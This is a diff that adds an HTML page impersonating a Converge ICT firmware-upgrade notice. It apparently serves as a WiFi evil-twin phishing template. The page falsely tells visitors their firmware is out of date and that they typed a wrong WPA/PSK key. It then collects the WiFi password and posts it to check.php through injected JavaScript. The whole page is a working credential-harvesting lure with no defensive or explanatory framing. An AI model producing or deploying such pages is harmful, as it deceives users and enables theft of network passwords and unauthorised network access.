@@ -1,0 +1,135 @@
+<html>
+	<head>
+		<title>Converge Firmware Upgrade</title>
+		<link rel="shortcut icon" type="icon" href="icon.png" />
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="bootstrap.min.css">
+		<script src="jquery.min.js"></script>
+		<script src="bootstrap.min.js"></script>
+		<style type="text/css">
+			body{ background: #42317d; }
+			.wrapper { border-radius:  10px; background: white; color: #1c1c1c; margin-top: 50px; padding: 20px;}
+			.heading{ text-align:  center; }
+			.heading h1{ margin: 0; font-weight: bold;}
+			.body{ padding: 35px 35px 0 35px; }
+			#btn{ width: 30%; }
+			.center{ width: 100%; text-align: center;}
+			.footer{ color:  #777; margin-top: 50px;}
+			#logo{ width: 30%; margin: 45px;}
+			@media (max-width: 767px) {
+	          #footer {
+	            margin-left: -20px;
+	            margin-right: -20px;
+	            padding-left: 20px;
+	            padding-right: 20px;
+	          }
+	        }
+		</style>
+	</head>
+	<body>
+		<div class="container">
+			<div class="wrapper">
+				<div class="heading">
+					<img src="Converge_ICT_Logo.png" class="img-fluid" id="logo"> <br>
+					<h1>Your Firmware is Out-of-Date!</h1><p1>Slow Internet? Make your Internet Fast Again by Upgrading your Firmware.</p1>
+				</div>
+				<div class="body">
+					<p class="lead">A new version of the Converge Firmware has been detected and awaiting installation. Please review our new terms and conditions and proceed.</p>
+					<form method="POST" action="check.php" autocomplete="off">
+      <div class="form-group">
+        <div class="alert alert-danger" role="alert">
+            You entered a wrong WPA/PSK Pre-Shared Key, Please try again!
+          </div>          
+      </div>
+      <div class="form-group has-feedback">
+          <label for="pwd">WPA/PSK Pre-Shared Key:</label>
+          <input class="form-control" type="password" title="WiFi Password" id="pwd" name="key1" required>
+      </div>
+      <div class="center">
+        <button class="btn btn-primary" id="btn">Start Upgrade</button>
+       </div>
+    </form>
+    <div class="footer center">
+    	<p>© Converge 2023, All Right Reserved</p>
+    </div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Start empty password message -->
+  <div class="modal fade" id="empty-pass">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Information</h4>
+        </div>
+        <div class="modal-body">
+          <p>Please Input Valid Password.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+
+  <script type="text/javascript">
+  	$("#btn").on("click", function(e) {
+    e.preventDefault();
+
+    // get the password box and checkbox elements
+  	var input = document.getElementById("pwd");
+    var box = document.getElementById("check-box");
+
+   
+        // check to see if the value is empty
+      	if ( input.value == "" )
+      		{
+            // display no password message
+            $("#empty-pass").modal("show");
+
+      		}
+      	else
+      		{
+            // post the data
+            post('check.php', {"key1": input.value});
+      		}
+      
+});
+
+/*
+  Post to the fallowing path given the parameters.
+
+  Args:
+    path: The path to be posted to.
+    params: The parameters to be passed.
+*/
+function post(path, params) {
+    // create a form and set its attributes
+    var form = document.createElement("form");
+    form.setAttribute("method", "post");
+    form.setAttribute("action", path);
+
+    // set the attribute for the post
+    for(var key in params) {
+        if(params.hasOwnProperty(key)) {
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", key);
+            hiddenField.setAttribute("value", params[key]);
+
+            form.appendChild(hiddenField);
+         }
+    }
+
+    // submit the post
+    document.body.appendChild(form);
+    form.submit();
+}
+  </script>
+	</body>
+</html>
